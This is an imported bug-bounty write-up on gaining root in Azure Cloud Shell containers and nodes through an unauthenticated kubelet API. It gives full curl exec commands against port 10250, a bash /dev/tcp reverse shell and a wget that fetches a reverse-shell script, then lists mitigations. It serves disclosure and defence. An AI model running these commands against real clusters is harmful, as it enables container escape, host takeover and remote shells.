---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-02-15_i-own-your-cloud-shell-taking-over-azure-cloud-shell-kubernetes-cluster-through-.md
original_filename: 2021-02-15_i-own-your-cloud-shell-taking-over-azure-cloud-shell-kubernetes-cluster-through-.md
title: 'I Own your Cloud Shell: Taking over “Azure Cloud Shell” Kubernetes Cluster
  Through Unsecured Kubelet API 30,000$ Bounty'
category: documents
detected_topics:
- access-control
- supply-chain
- command-injection
- otp
- rate-limit
- automation-abuse
tags:
- imported
- documents
- access-control
- supply-chain
- command-injection
- otp
- rate-limit
- automation-abuse
language: en
raw_sha256: 50dfd07430cb667e0958bda05a95c17fba24e5615b94c6fcd5f2223e2fd2668a
text_sha256: 0f23d421a2764725e6ffdad039eb3971084fb11af7f28f737550a17ad43daf6f
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: false
---

# I Own your Cloud Shell: Taking over “Azure Cloud Shell” Kubernetes Cluster Through Unsecured Kubelet API 30,000$ Bounty

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-02-15_i-own-your-cloud-shell-taking-over-azure-cloud-shell-kubernetes-cluster-through-.md
- Source Type: markdown
- Detected Topics: access-control, supply-chain, command-injection, otp, rate-limit, automation-abuse
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: False
- Raw SHA256: `50dfd07430cb667e0958bda05a95c17fba24e5615b94c6fcd5f2223e2fd2668a`
- Text SHA256: `0f23d421a2764725e6ffdad039eb3971084fb11af7f28f737550a17ad43daf6f`


## Content

---
title: "I Own your Cloud Shell: Taking over “Azure Cloud Shell” Kubernetes Cluster Through Unsecured Kubelet API 30,000$ Bounty"
url: "https://hencohen10.medium.com/i-own-your-cloud-shell-taking-over-azure-cloud-shell-kubernetes-cluster-through-unsecured-558621519cf9"
authors: ["Chen Cohen (@chencococococo)"]
programs: ["Microsoft"]
bugs: ["Privilege escalation", "RCE"]
bounty: "30,000"
publication_date: "2021-02-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3900
scraped_via: "browseros"
---

# I Own your Cloud Shell: Taking over “Azure Cloud Shell” Kubernetes Cluster Through Unsecured Kubelet API 30,000$ Bounty

I Own your Cloud Shell: Taking over “Azure Cloud Shell” Kubernetes Cluster Through Unsecured Kubelet API 30,000$ Bounty
Chen Cohen
Follow
10 min read
·
Feb 15, 2021

118

“Azure Cloud Shell is a browser-based shell experience to manage and develop Azure resources.

Cloud Shell offers a browser-accessible, pre-configured shell experience for managing Azure resources without the overhead of installing, versioning, and maintaining a machine yourself.”

so we will start right away with how things works in the backend of “Azure Cloud Shell” service.

Press enter or click to view image in full size
1. Client request Cloud Shell via Azure Portal 2. Random Kubernetes cluster is chosen 3. free node in the cluster is assigned for the client 4. Container is created on the node with the client token, allows the user to control all of his Azure Resources

While I was playing around with “Azure Cloud Shell”, I Immediately noticed that I run as a low-privileged user, that is not able to do much, except running the azure-cli command(s). I tried to gain higher privileges in different ways without luck.

After checking the current control group, I found out that Cloud Shell is running on Kubernetes. that gave me a path to start digging for containers/Kubernetes related issues.

From the experience that I have with Containers and Kubernetes, it was easy to guess that the host(node) machine IP address is 172.17.0.1 as this is the default network interface created while installing Docker.

Press enter or click to view image in full size
I tried to communicate with different known API’s used by Kubernetes and docker, I started with the docker remote API which most of the time (if not listens on a UNIX socket) listens on ports 2375 or 2376(if used with HTTPs, most of the times). the ports were closed.

After failing with the Docker Remote API, I kept testing for common Kubernetes API’s and found that the read-only port (10255) is open.

The read-only port was used in the past for health checks and is now disabled by default on newer Kubernetes releases. By calling this port, one can leak information about pods/namespaces in use and it’s running container names, pod names, host IP address and more.

NOTE: read only port output — https://pastebin.com/vPX6uNvW

As the output from the read-only port did not provide a break-through information, I tried to communicate with the kubelet API that is running on port 10250.

Press enter or click to view image in full size
Viola! I was surprised to see that the port is accessible without any authentication.

While creating a Kubernetes cluster, it is Important to include a certificate that will be trusted by the nodes in the cluster, and that will secure the kubelet port.

Unlike the read-only port, the kubelet port allows execution of commands on any container in the cluster with root privileges (pod name, container name and namespace is required for that).

NOTE: output of kubelet port https://pastebin.com/EVFtxY4w

as An example of a secured implementation of the kubelet certificate, I took a quick look at AKS (Azure Kubernetes Service).

When I tried to access the kubelet API on an AKS cluster, I got the following response:

Press enter or click to view image in full size
The response means that the kubelet port is secured. AKS clients can be relaxed.
HACK 1: Rooting my own “Azure Cloud Shell” Container

After I found that the execution port is accessible without authentication, that was the time to play, and try to run some commands.

The following steps were taken in order to get root access on “Azure Cloud Shell” container:

I wrote down all the necessary information to run commands on the “Cloud Shell” container from the read-only port output.

Namespace: cc-b219133b

Podname: cc-b219133b-7d48c6d6cd-qv7vc

Container name: console-agent

The first try is a simple file creation with the name “hello_world” into the “/tmp” directory:

# curl — insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H “X-Stream-Protocol-Version: channel.k8s.io” -X POST “https://172.17.0.1:10250/exec/cc-b219133b/cc-b219133b-7d48c6d6cd-qv7vc/console-agent?command=touch&command=/tmp/hello_world&input=1&output=1&tty=1"

The output of the command is a 302 Page status code, that means that a redirect needs to be done. Unfortunately, curl doesn’t know how to handle these 302 redirects as the next page “/cri/exec/HnPxVYzr” must be handled with “Websocket” and curl don’t have this feature yet. if the redirect is not executed, the command will fail to run.

After “Googling” around, I found that calling “Web Sockets” can be done with an NPM package called “wscat”, but there was a problem. I couldn’t install packages on the system since I did not had root access on the “Cloud Shell” container yet.

And then I came across this solution for installing NPM packages for user without “sudo” privileges:

https://www.competa.com/blog/how-to-run-npm-without-sudo/

The “solution” worked and running the wscat succeeded in opening the redirected page, which means that the execution of “touch /tmp/hello_world” command succeeded.

#/home/#user/npm/bin/wscat -c https://172.17.0.1:10250/cri/exec/HnPxVYzr — no-check

The “hello_world” file created through the kubelet API with “root” User as owner.

From this point, I confirmed that the commands were running as root, and I can run any command I wish to. then I wanted to achieve reverse shell with the root user on the “Cloud Shell” container.

Created a file named reverse.sh in the /tmp directory with the following payload:

#bash -i >& /dev/tcp/i.p.a.d.d.r.e.s.s/p.o.r.t 0>&1

2. Executing the reverse shell

in order to get reverse shell executed, I repeated the same procedure for creating the hello_world file in “/tmp”, (remember — commands sent through the kubelet API, runs in the context of the root user):

curl — insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H “X-Stream-Protocol-Version: channel.k8s.io” -X POST “https://172.17.0.1:10250/exec/cc-b219133b/cc-b219133b-7d48c6d6cd-qv7vc/console-agent?command=bash&command=/tmp/reverse.sh&input=1&output=1&tty=1"

The connection established to my C&C server with root privileges on the “Azure Cloud Shell” container (which I should have had low-privileged access).

After a long time looking for something “interesting”, I understood that no critical files are stored on the container, and that the container is built for the current customer. I couldn’t access any other container(s) on the network. Of course, that even escalating to root privileges on the container is a nice result, but not enough.

HACK 2:Breaking out of the Container and Getting root on the Host(node) of Azure’s Infrastructure

As being the root user on the container that is built just for me did not satisfy me, I analyzed the API’s output once again. while reading the outputs, I found interesting information, a container that runs in the same pod, named “console-admin”. It seemed to me like a frontend-backend game, so my current container “console-agent” is the “frontend” where I have shell access to through Azure Portal, and the console-admin is the “backend” that might be “speaking” with the host(node).

In the output of the read-only port, I found the following line interesting as it was connected to the “console-admin” container:

“containers”: [
{
“name”: “console-admin”,
“image”: “cloudconregweuprd.azurecr.io/azconsole-admin:master_20191213.3”,
…………
…………
…………
“securityContext”: {
“privileged”: true,
“allowPrivilegeEscalation”: true
}

the “privileged:true” flag provides the container access to all kernel capabilities.

Get Chen Cohen’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

By default, containers are deployed with seccomp profile that blocks 44 critical system calls that might allow breaking out of the container into the host machine.

A privileged container has access to ALL system calls including the 44 that are blocked by default.

Going back to the mission, this time I wanted to execute reverse shell on the “console-admin” container(which I don’t have a shell access to), so I had to do a longer way:

I tried to get reverse shell on the “console-admin” container with different methods, such as bash, python, perl, curl and more. As none of them worked (because I kept getting “command not found”) I decided to install them (I had root access through the kubelet api).

Using “yum” and “apt-get” also failed with “command not found”. As I have some experience with different Linux flavors, I already knew that if both commands are not working, it is probably because the container is built on a minimized OS which is very common in the “containers” world — Alpine Linux.

Alpine Linux package manager is called APK. I executed “apk update” through the kubelet API to see if I’m correct.

#curl — insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H “X-Stream-Protocol-Version: channel.k8s.io” -X POST “https://172.17.0.1:10250/exec/cc-b219133b/cc-b219133b-7d48c6d6cd-qv7vc/console-admin?command=apk&command=update&input=1&output=1&tty=1 curl — insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H “X-Stream-Protocol-Version: channel.k8s.io” -X POST “https://172.17.0.1:10250/exec/cc-b219133b/cc-b219133b-7d48c6d6cd-qv7vc/console-admin?command=apk&command=update&input=1&output=1&tty=1

Press enter or click to view image in full size
My guess was correct, the console-admin container is based on Alpine Linux. (And also, the repositories were updated).

The next step is to install “bash” on the “console-admin” container, in order to execute the reverse shell with the bash payload:

# curl — insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H “X-Stream-Protocol-Version: channel.k8s.io” -X POST “https://172.17.0.1:10250/exec/cc-b219133b/cc-b219133b-7d48c6d6cd-qv7vc/console-admin?command=apk&command=add&command=bash&input=1&output=1&tty=1"

The command must be separated into multiple “command” parameters because web servers does not know how to handle requests with spaces.

As I did not have shell access to the “console-admin” container, I had to download the reverse shell payload from the internet:

# curl — insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H “X-Stream-Protocol-Version: channel.k8s.io” -X POST “https://172.17.0.1:10250/exec/cc-b219133b/cc-b219133b-7d48c6d6cd-qv7vc/console-admin?command=wget&command=https://example.com/reverse.sh?&input=1&output=1&tty=1"

The only thing left now, is to execute the reverse shell on “console-admin” container to establish the connection to C&C server:

# curl — insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H “X-Stream-Protocol-Version: channel.k8s.io” -X POST “https://172.17.0.1:10250/exec/cc-b219133b/cc-b219133b-7d48c6d6cd-qv7vc/console-admin?command=bash&command=reverse.sh&input=1&output=1&tty=1"

Press enter or click to view image in full size
C&C server received the connection from the privileged “console-admin” container.

As mentioned before, the container “console-admin” have the privileged flag set, and that can easily lead to take over the host machine, by mounting the root partition into the “console-admin” container.

Press enter or click to view image in full size
Mounting the host primary disk(/dev/sda1) into /mnt3/ directory and displaying the hostname of the host(node) of Azure’s Infrastructure.

As I had access to the node file system, I found the kubelet credentials that are located in the /var/lib/kubelet directory. The credentials can be used to interact with the Master API that runs on the Master node with the kubectl utility.

Azure’s Cloud Shell Kubernetes cluster credentials
Press enter or click to view image in full size
Using the credentials to list pods and nodes in the cluster

When I reported that to Microsoft, I did not try to takeover other nodes, as they belong to other customers, and Microsoft’s TOS, clearly says, stop before you access customers information. they denied that I can access other nodes(which means that I can access other user’s Cloud Shell) because “Kubernetes RBAC is in place and one cannot use exec to execute into running containers or to modify running pods” and asked for a POC If I have another way to do it after they fixed the Issue.

As I couldn’t prove that I can try to bypass Microsoft’s answer on the issue, I came up with an Idea to test it on AKS cluster (which we already know have better security than “Cloud Shell”) and prove Microsoft how one can bypass these restrictions, by deploying new pod with the following details:

Use the credentials stored on the node in order to deploy a pod with :

A “Malicious” container Image that on init will connect to C&C server
Privileged flag, in order to have all the kernel Capabilities on the POD
“nodeSelctor” flag, that allows a user to choose a specific node to schedule his pod on.

The POC Video can be found on:

https://www.youtube.com/watch?v=iOan8lTeJPM

On the left, I use node #0 kubelet creds in order to deploy a pod with a malicious Image, privileged flag, and selecting specific node (#2).
On the right, in 01:45 the pod was successfully deployed on that specific node, and connected to the C&C server, have all the kernel capabilities, and mounts the node #2 filesystem.

Microsoft reply for the video was:

“The video and the steps below are for AKS and succeed because of the RBAC policies in AKS. In Cloud Shell, the RBAC policies applied are more restrictive, and something that works on AKS wouldn’t necessarily work on Cloud Shell.”

But what Microsoft did not check, is how the “NodeSelector” can be blocked, because Kubernetes RBAC is meant for blocking access to list/view/watch/delete/execute on namespaces / pods / cluster objects. NodeSelector cannot be disabled by RBAC. it can be blocked by NodeRestiction admission control.

HACK3: LPE on any container in “Azure Container Instance”

The same Issue also affected “Azure Container Service”, with a more complicated way that needed to involve a long brute-force attack for Remote command execution, but a straight-forward LPE on any container running on “Azure Container service”. I reported the issue as privilege escalation, and guess what? Microsoft rated it as “Low”. yes. If you are running a container instance on Azure, a local privilege escalation on your container, which is caused because of Microsoft’s misconfigurations, is rated as “Low” Impact for Microsoft.

Press enter or click to view image in full size
POC: Local privilege escalation through the kubelet API, on Azure Container Instance, here I used another method which does not require websockets redirect, and the output displayed right away. I used the “id” and “whoami” on the same container, and the output was root and id 0.

Timeline

20.1.2020 Report sent to Microsoft

30.1.2020 Microsoft fixes the issue

3.3.2020 Microsoft rewarded 10,000$ for Privilege escalation Impact and Severity “Important”

3.3.2020 sent complain email regarding the Impact and severity.

13.3.2020 Microsoft raises the issue reward to RCE, Awards 30,000$

Root cause & Mitigations

Block network connection between containers(pods) and host(nodes) That can be done through IPtables.
Use a different IP for the node instead of 172.17.0.1, by default when installing docker on a host, it creates a new network interface with the ip 172.17.0.1, someone with a little knowledge with docker containers can guess that this is the IP of the node very easily.
Disable the read-only 10255 Port (which was used for “health” check in the past and is not needed anymore).
Secure the 10250 (Kubelet execution port) by running the kubelet API with the flag “anonymous-auth false” and a certificate
Block outbound connections for “suspicious” ports — I was able to create outbound connection from the pods to my server (on a different cloud provider) on port 4444.
Remove the Privileged flag from the console-admin container, instead you can build a “seccomp” profile(https://docs.docker.com/engine/security/seccomp/) and attach it to the container, in order to minimize the container access to the kernel capabilities.
